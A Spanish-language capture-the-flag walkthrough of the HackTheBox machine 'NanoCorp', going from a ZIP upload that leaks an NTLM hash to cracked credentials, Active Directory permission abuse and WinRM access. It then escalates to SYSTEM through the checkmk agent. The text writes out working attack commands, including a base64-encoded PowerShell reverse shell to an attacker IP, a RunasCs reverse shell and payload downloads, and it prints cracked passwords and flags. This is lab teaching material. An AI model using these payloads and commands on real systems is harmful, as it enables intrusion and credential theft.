---
hidden: true
icon: flag
---

# NanoCorp HackTheBox (Hard)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 09:18 CET
Nmap scan report for 10.10.11.93
Host is up (0.032s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://nanocorp.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-09 15:18:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
|_http-title: Not Found
| tls-alpn:
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
52162/tcp open  msrpc         Microsoft Windows RPC
52277/tcp open  msrpc         Microsoft Windows RPC
56464/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
56469/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m58s
| smb2-time:
|   date: 2025-11-09T15:19:29
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.58 seconds
```

Veremos varios puertos interesantes, pero entre ellos el puerto `80` aparte de otros puertos como `LDAP, WinRM, Kerberos, SMB, ...`, vemos que en el reporte de `nmap` ya nos esta diciendo el `dominio` al que se esta redirigiendo en la pagina llamado `nanocorp.htb`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>            nanocorp.htb dc01.nanocorp.htb
```

Lo guardamos y si entramos a dicho dominio de esta forma:

```
URL = http://nanocorp.htb/
```

Veremos una pagina simple, aparentemente normal, investigando un poco el codigo veremos que hay un `subdominio` asociado al `dominio` llamado `hire.nanocorp.htb` en esta linea:

```html
<a href="http://hire.nanocorp.htb" class="btn tm-btn-gray">Apply Now</a>
```

Vamos añadirlo añadirlo a nuestro archivo `hosts`:

```shell
nano /etc/hosts

#Dentro del nano
<IP>            nanocorp.htb dc01.nanocorp.htb hire.nanocorp.htb
```

Lo guardamos y entraremos a dicho `subdominio`.

```
URL = http://hire.nanocorp.htb
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-09 093009.png" alt=""><figcaption></figcaption></figure>

Veremos como una especie de `registro` en el que podemos subir archivos comprimidos, vamos a probar a realizar un ataque `ZIP`, si probamos a enviar un archio `ZIP` conc cualquier contenido veremos el siguiente mensaje:

```
File Uploaded and Extracted Successfully
```

Vemos que nos esta extrayendo el archivo, por lo que podemos deducir que lo extrae y ejecuta para visualizarlo, si realizamos un `fuzzing`de directorios veremos que hay una carpeta `/uploads` pero que esta como `403 Forbidden` por lo que no podremos acceder de ninguna forma, buscando un pcoo de informacion en internet sobre una tecnica llamada `Zip Slip` veremos esta pagina:

URL = [Zip Slip tecnica Writeup HTB](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)

Gracias a este usuario podremos ver que comparte un `PoC` en el que genera un archivo de `windows` para realizar un intento de lectura de `SMB`, por lo que estando a la escucha con `reponder` podremos capturar ese `hash NTLMv2` e intentar `crackearlo`, vamos a probar eso.

URL = [PoC CVE-2025-24071 / CVE-2025-24054](https://github.com/Marcejr117/CVE-2025-24071_PoC/blob/main/PoC.py)

## Escalate user web\_svc

Vamos a utilizarlo de esta forma:

```shell
git clone https://github.com/Marcejr117/CVE-2025-24071_PoC.git
cd CVE-2025-24071_PoC/
python3 PoC.py test <IP_ATTACKER>
```

Info:

```
[+] File test.library-ms created successfully.
```

Ahora que se nos ha generado el archivo `exploit.zip` vamos a ponernos a la escucha antes de subirlo a la web.

### Hash NTLMv2 (Zip Slip)

```shell
responder -I tun0
```

Ahora si subimos el archivo `exploit.zip` a la web y esperamos un rato, veremos lo siguiente en el `responder`:

```
[SMB] NTLMv2-SSP Client   : 10.10.11.93
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:54088e04830e6b0b:EBB9F27F69C78D5981EE90E4BB1A5B3C:0101000000000000806C65BD7051DC0150E582C8BB5FB6820000000002000800320052004800450001001E00570049004E002D0059004E004B0049004B0058004E00370036005300340004003400570049004E002D0059004E004B0049004B0058004E0037003600530034002E0032005200480045002E004C004F00430041004C000300140032005200480045002E004C004F00430041004C000500140032005200480045002E004C004F00430041004C0007000800806C65BD7051DC01060004000200000008003000300000000000000000000000002000006444DAD3D91C126276954205284AFB32DBCD0DA4A0A318F6BDC901E816E4A3510A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200320039000000000000000000
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
[*] Skipping previously captured hash for NANOCORP\web_svc
```

Vemos que ha funcionado, por lo que vamos a probar a `crackear` dicho `hash`.

> hash

```
web_svc::NANOCORP:54088e04830e6b0b:EBB9F27F69C78D5981EE90E4BB1A5B3C:0101000000000000806C65BD7051DC0150E582C8BB5FB6820000000002000800320052004800450001001E00570049004E002D0059004E004B0049004B0058004E00370036005300340004003400570049004E002D0059004E004B0049004B0058004E0037003600530034002E0032005200480045002E004C004F00430041004C000300140032005200480045002E004C004F00430041004C000500140032005200480045002E004C004F00430041004C0007000800806C65BD7051DC01060004000200000008003000300000000000000000000000002000006444DAD3D91C126276954205284AFB32DBCD0DA4A0A318F6BDC901E816E4A3510A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200320039000000000000000000
```

Ahora con `john` lo haremos de esta forma:

```shell
john --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dksehdgh712!@#   (web_svc)
1g 0:00:00:01 DONE (2025-11-09 12:14) 0.7299g/s 1354Kp/s 1354Kc/s 1354KC/s domanick05..djcward
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, por lo que vamos a obtener un `ZIP` del `AD` entero para pasarselo a `BloodHound`.

## Escalate user MONITORING\_SVC

```shell
apt install cargo
cargo install rusthound
export PATH="$HOME/.cargo/bin:$PATH"
rusthound --domain nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --zip
```

Info:

```
---------------------------------------------------
Initializing RustHound at 12:28:17 on 11/09/25
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2025-11-09T11:28:17Z INFO  rusthound] Verbosity level: Info
[2025-11-09T11:28:17Z INFO  rusthound::ldap] Connected to NANOCORP.HTB Active Directory!
[2025-11-09T11:28:17Z INFO  rusthound::ldap] Starting data collection...
[2025-11-09T11:28:18Z INFO  rusthound::ldap] All data collected for NamingContext DC=nanocorp,DC=htb
[2025-11-09T11:28:18Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2025-11-09T11:28:18Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
[2025-11-09T11:28:18Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2025-11-09T11:28:18Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2025-11-09T11:28:18Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2025-11-09T11:28:18Z INFO  rusthound::json::maker] 6 users parsed!
[2025-11-09T11:28:18Z INFO  rusthound::json::maker] 61 groups parsed!
[2025-11-09T11:28:18Z INFO  rusthound::json::maker] 1 computers parsed!
[2025-11-09T11:28:18Z INFO  rusthound::json::maker] 2 ous parsed!
[2025-11-09T11:28:18Z INFO  rusthound::json::maker] 1 domains parsed!
[2025-11-09T11:28:18Z INFO  rusthound::json::maker] 2 gpos parsed!
[2025-11-09T11:28:18Z INFO  rusthound::json::maker] 21 containers parsed!
[2025-11-09T11:28:18Z INFO  rusthound::json::maker] .//20251109122818_nanocorp-htb_rusthound.zip created!

RustHound Enumeration Completed at 12:28:18 on 11/09/25! Happy Graphing!
```

Esto nos volcara un `.zip` el cual tendremos que cargar en `BloodHound`.

### BloodHound

Ahora vamos a instalar `BloodHound` de forma rapida en un `docker`:

URL = [Download BloodHound en Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```shell
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
```

Info:

```
..............................<RESTO DE INFO>......................................
Container bloodhound-graph-db-1  Creating
 Container bloodhound-app-db-1  Creating
 Container bloodhound-graph-db-1  Created
 Container bloodhound-app-db-1  Created
 Container bloodhound-bloodhound-1  Creating
 Container bloodhound-bloodhound-1  Created
 Container bloodhound-app-db-1  Starting
 Container bloodhound-graph-db-1  Starting
 Container bloodhound-app-db-1  Started
 Container bloodhound-graph-db-1  Started
 Container bloodhound-graph-db-1  Waiting
 Container bloodhound-app-db-1  Waiting
 Container bloodhound-graph-db-1  Healthy
 Container bloodhound-app-db-1  Healthy
 Container bloodhound-bloodhound-1  Starting
 Container bloodhound-bloodhound-1  Started
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Ahora que esta importado en nuestro `docker` y levantado podremos acceder a el desde la siguiente `URL`.

```
URL = http://127.0.0.1:8080/ui/login
```

Nos logueamos con las credenciales propocionadas por la herramienta, entrando nos pedira cambiar las credenciales y ya nos metera dentro:

```
User: admin
Pass: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
```

Una vez dentro vamos a importar el `.zip` y tendremos que esperar un poco a que cargue todos los datos, despues cuando vayamos al `dashboard` principal veremos todos los datos, vamos a investigar el usuario `web_svc` a ver que tiene.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-09 123245.png" alt=""><figcaption></figcaption></figure>

Vemos algo interesante y es que el usuario `web_svc` pertenece al grupo de `IT_SUPPORT` que este a su vez puede realizar un `ForceChangePassword` al usuario `MONITORING_SVC`, por lo que vamos a realizar lo siguiente:

URL = [GitHub BloodyAD](https://github.com/CravateRouge/bloodyAD)

### Añadirnos al grupo IT\_SUPPORT

Vamos añadirnos al grupo utilizando `bloodyAD` de esta forma:

```shell
bloodyAD -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' --host <IP> add groupMember 'IT_SUPPORT' 'web_svc'
```

Info:

```
[+] web_svc added to IT_SUPPORT
```

Veremos que ha funcionando, ahora siendo de esta grupo vamos a cambiar la contraseña de dicho usuario.

### Cambiar password de MONITORING\_SVC

```shell
bloodyAD -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' --host <IP> set password 'MONITORING_SVC' 'NuevaPassword123!'
```

Info:

```
[+] Password changed successfully!
```

Teniendo esto vamos a importarnos un `TGT` de esta forma:

```shell
ntpdate nanocorp.htb ; impacket-getTGT nanocorp.htb/'MONITORING_SVC':'NuevaPassword123!'
```

Info:

```
2025-11-09 20:35:05.028086 (+0100) +45.635830 +/- 0.014368 nanocorp.htb 10.10.11.93 s1 no-leap
CLOCK: time stepped by 45.635830
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in MONITORING_SVC.ccache
```

Ahora vamos a exportarla en una variable de entorno de `Kerberos`:

```shell
export KRB5CCNAME=MONITORING_SVC.ccache
```

Hecho esto vamos a utilizar el siguiente script de `python3` para podernos conectar por `WinRM` con `SSL` ya que el `evil-winrm` no funciona muy bien mediante `kerberos`.

### WinRM por SSL

Antes vamos a generar el archivo para el `KDC` y que no de problemas:

```shell
netexec smb <IP> -k --generate-krb5-file krb5.conf --use-kcache
```

Info:

```
SMB         10.10.11.93     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.93     445    DC01             [+] NANOCORP.HTB\web_svc from ccache
```

Ahora vamos a sobreescribirlo moviendolo aqui:

```shell
mv krb5.conf /etc/krb5.conf
```

Vamos a descargarnos del siguiente repo esta herramienta:

URL = [GitHub winrmexec.py](https://github.com/ozelis/winrmexec)

```shell
git clone https://github.com/ozelis/winrmexec.git
cd winrmexec/
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python3 winrmexec.py -ssl -port 5986 -k -no-pass dc01.nanocorp.htb
```

Info:

```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] '-target_ip' not specified, using dc01.nanocorp.htb
[*] '-url' not specified, using https://dc01.nanocorp.htb:5986/wsman
[*] using domain and username from ccache: NANOCORP.HTB\MONITORING_SVC
[*] '-spn' not specified, using HTTP/dc01.nanocorp.htb@NANOCORP.HTB
[*] '-dc-ip' not specified, using NANOCORP.HTB
PS C:\Users\monitoring_svc\Documents> whoami
nanocorp\monitoring_svc
```

Veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
6bb3cdb3f8b7d87ed851e1d6294113ac
```

## Privilege Escalation

Si empezamos a realizar un poco de `fuzzing` sobre archivos instalados manualmente, veremos uno bastante interesante llamado `checkmk`.

```powershell
Get-ChildItem "C:\Program Files (x86)\" | Select-Object Name, CreationTime, LastWriteTime
```

Info:

```
Name                 CreationTime         LastWriteTime
----                 ------------         -------------
checkmk              4/5/2025 4:17:43 PM  4/5/2025 4:17:43 PM
Common Files         5/8/2021 1:20:24 AM  5/8/2021 1:34:59 AM
Internet Explorer    5/8/2021 1:20:24 AM  11/3/2025 4:13:11 PM
Microsoft            10/8/2020 3:46:56 PM 5/8/2021 2:40:21 AM
Microsoft.NET        5/8/2021 1:20:24 AM  5/8/2021 1:34:49 AM
Windows Defender     5/8/2021 1:20:24 AM  5/8/2021 2:35:26 AM
Windows Mail         5/8/2021 1:20:24 AM  11/3/2025 4:13:11 PM
Windows Media Player 5/8/2021 2:37:48 AM  11/3/2025 4:13:11 PM
Windows NT           5/8/2021 1:20:24 AM  5/8/2021 2:35:26 AM
Windows Photo Viewer 5/8/2021 1:20:24 AM  11/3/2025 4:13:11 PM
WindowsPowerShell    5/8/2021 1:20:24 AM  5/8/2021 1:34:49 AM
```

Es el unico que nos llama la atencion, si intentamos ver que version tiene no podremos, pero si listamos los procesos veremos algo interesante:

```powershell
Get-Process | Where-Object {$_.ProcessName -like "*check*" -or $_.ProcessName -like "*mk*"} | Select-Object ProcessName, Id, Path
```

Info:

```
rocessName      Id Path
-----------      -- ----
check_mk_agent 2776
cmk-agent-ctl  3872
```

### Explotación binario checkmk

Con esto si investigamos veremos que tiene un `CVE` asociado al binario con ese proceso llamado `CVE-2022-46800 - CheckMK Agent RCE`, si listamos a ver si esta en ejecuccion...

```shell
netstat -ano | findstr ":6556"
```

Info:

```
TCP    0.0.0.0:6556           0.0.0.0:0              LISTENING       3872
```

Vemos que si esta en ejecuccion escuchando en todas las direcciones, por lo que vamos a explotarlo, pero despues de un buen rato buscando por internet encontre esta pagina:

URL = [Exploit checkmk privilege escalation](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)

Si lo probamos tal cual con el usuario `MONITORING_SVC` veremos que no ira, por lo que vamos a descargarnos `RunasCs.exe` y cambiarnos al usuario `web_svc` de esta forma:

URL = [Download GitHub RunasCs.exe](https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip)

Nos lo pasamos a la maquina victima de esta forma:

```shell
python3 -m http.server 80
```

Abierto el servidor de `python3` vamos a pasarnoslo asi:

```powershell
cd C:\Windows\Temp
Invoke-WebRequest http://<IP_ATTACKER>/RunasCs.exe -o RunasCs.exe
```

Hecho esto, lo ejecutaremos de la siguiente forma:

```powershell
.\RunasCs.exe web_svc 'dksehdgh712!@#' powershell.exe -r <IP>:<PORT>
```

Pero antes de ejecutarlo nos pondremos a la escucha desde otra terminal con `nc`.

```shell
nc -lvnp <PORT>
```

Ahora si lo ejecutamos y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.15.229] from (UNKNOWN) [10.10.11.93] 64281
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
nanocorp\web_svc
```

Veremos que ha funcionado, por lo que vamos a probar la explotacion creando primero el archivo `malicioso`.

Generamos el archivo malicioso `.bat`:

```powershell
echo "@echo off`npowershell -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAIgAxADAALgAxADAALgAxADUALgA5ADkAIgAsADUAMwApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACwAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAkAGQAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAJABpACkAOwAkAHIAPQBpAGUAeAAgACQAZAAgADIAPgAmADEAfABPAHUAdAAtAFMAdAByAGkAbgBnADsAJAByADIAPQAkAHIAKwAiAFAAUwAgACIAKwBbAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBQAGEAdABoAEkAbgBmAG8AXQAuAEcAZQB0AFAAcgBvAHAAZQByAHQAeQAoACIAUABhAHQAaAAiACkALgBHAGUAdABWAGEAbAB1AGUAKAAoAHAAdwBkACkAKQArACIAPgAgACIAOwAkAHMAYgA9AFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAkAHIAMgApADsAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAC4AQwBsAG8AcwBlACgAKQAKAA==" | Set-Content C:/Temp/test.bat
```

Nos tendremos que pasar tambien el `nc.exe` a la maquina victima para obtener la `shell`, hecho todo esto vamos a mover el archivo a `Temp` de `Windows`, tambien le tendremos que dar permisos de ejecuccion a los 2 binarios (`nc.exe y exploit.bat`) con `icacls` super importante.

```powershell
icacls C:/Temp/nc.exe /grant Everyone:F
icacls C:/Temp/test.bat /grant Everyone:F
```

Ahora vamos a ejecutar el bucle para que cree dichos archivos:

```powershell
1000..10000 | foreach { copy C:/Temp/test.bat C:\Windows\Temp\cmk_all_${_}_1.cmd; Set-ItemProperty -path C:\Windows\Temp\cmk_all_${_}_1.cmd -name IsReadOnly -value $true; }
```

Una vez que termine nos pondremos a la escucha desde otra terminal:

```shell
nc -lvnp <PORT>
```

Y en la maquina victima vamos a ejecutar esto, pero antes veremos los `.msi` que tenemos:

```powershell
ls C:\Windows\Installer\*.msi
```

Info:

```
    Directory: C:\Windows\Installer


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/28/2025   3:08 PM       12637696 1e6f2.msi
-a----         5/10/2023   9:16 AM         184320 387c2.msi
-a----         5/10/2023   9:21 AM         184320 387c6.msi
-a----         5/10/2023   9:35 AM         192512 387ca.msi
-a----         5/10/2023   9:39 AM         192512 387ce.msi
-a----          4/2/2025   6:24 PM       60895232 387d1.msi
```

Vamos a probar con el primero que es el que me dio resultado;

```powershell
msiexec /fa C:\Windows\Installer\1e6f2.msi
```

Ahora si volvemos a donde tenemos la escucha.

```
listening on [any] 7755 ...
connect to [10.10.15.229] from (UNKNOWN) [10.10.11.93] 53492

PS C:\Windows\system32> whoami
nt authority\system
```

Veremos que ha funcionado, por lo que seremos `nt authority\system` directamente, por lo que leeremos la `flag` del `administrador`.

> root.txt

```
2f2ff200c1c006e850e7a97f39c2a837
```
